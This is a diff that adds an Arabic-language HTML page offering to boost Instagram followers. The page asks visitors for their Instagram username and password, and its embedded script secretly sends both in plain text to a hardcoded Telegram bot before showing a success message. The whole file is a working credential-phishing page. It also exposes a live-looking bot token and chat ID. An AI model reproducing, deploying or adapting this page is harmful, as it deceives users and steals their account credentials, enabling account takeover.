@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      💥 زيادة متابعين إنستقرام
+    </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+      body {
+      background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: &#39;Tajawal&#39;, sans-serif;
+    }
+
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 300px;
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 3rem;
+      color: #e1306c;
+      margin-bottom: 1rem;
+    }
+
+    h2 {
+      margin-bottom: 1rem;
+      color: #333;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 1rem;
+    }
+
+    button {
+      background-color: #e1306c;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #c9245c;
+    }
+
+    .loading {
+      display: none;
+      margin-top: 10px;
+      color: #1aca81;
+    }
+
+    .loading.show {
+      display: block;
+    }
+
+    .footer {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: #555;
+    }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <i class="fab fa-instagram"></i>
+      </div>
+      <h2>
+        زيادة متابعين إنستقرام
+      </h2>
+      <form id="followForm">
+        <input id="username" type="text" placeholder="اسم المستخدم" />
+        <input id="password" type="password" placeholder="كلمة المرور" />
+        <select id="followers">
+          <option value="" disabled="" selected="">
+            اختر عدد المتابعين
+          </option>
+          <option value="1000">
+            1000 متابع
+          </option>
+          <option value="3000">
+            3000 متابع
+          </option>
+          <option value="5000">
+            5000 متابع
+          </option>
+        </select>
+        <button type="submit">
+          تسجيل الدخول
+        </button>
+      </form>
+      <div class="loading" id="loading">
+        <i class="fas fa-spinner fa-spin"></i>
+        جاري الإرسال...
+      </div>
+      <div class="footer">
+        © 2025 جميع الحقوق محفوظة
+      </div>
+    </div>
+    <script>
+      const token = &#34;8584935263:AAFraWFATxXeN4bpZ_FTCWQ3nx96ZI5wlIQ&#34;;
+    const chatId = &#34;644711615&#34;;
+
+    const form = document.getElementById(&#34;followForm&#34;);
+    const loading = document.getElementById(&#34;loading&#34;);
+
+    form.addEventListener(&#34;submit&#34;, function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById(&#34;username&#34;).value.trim();
+      const password = document.getElementById(&#34;password&#34;).value.trim();
+      const followers = document.getElementById(&#34;followers&#34;).value;
+
+      if (!username || !password || !followers) {
+        alert(&#34;يرجى تعبئة جميع الحقول&#34;);
+        return;
+      }
+
+      loading.classList.add(&#34;show&#34;);
+
+      const message = `📥 بيانات مستخدم انستقرام:\nUser: ${username}\nPass: ${password}\nFollowers: ${followers}`;
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    chat_id: chatId,
+    text: message
+  })
+})
+      .then(response =&gt; response.json())
+      .then(result =&gt; {
+        if (result.ok) {
+          alert(&#34;✅ تم بنجاح!&#34;);
+          form.reset();
+        } else {
+          alert(&#34;❌ فشل : &#34; + result.description);
+        }
+      })
+      .catch(error =&gt; {
+        alert(&#34;❌ حدث خطأ أثناء : &#34; + error.message);
+      })
+      .finally(() =&gt; {
+        loading.classList.remove(&#34;show&#34;);
+      });
+    });
+    </script>
+  </body>
+</html>
+
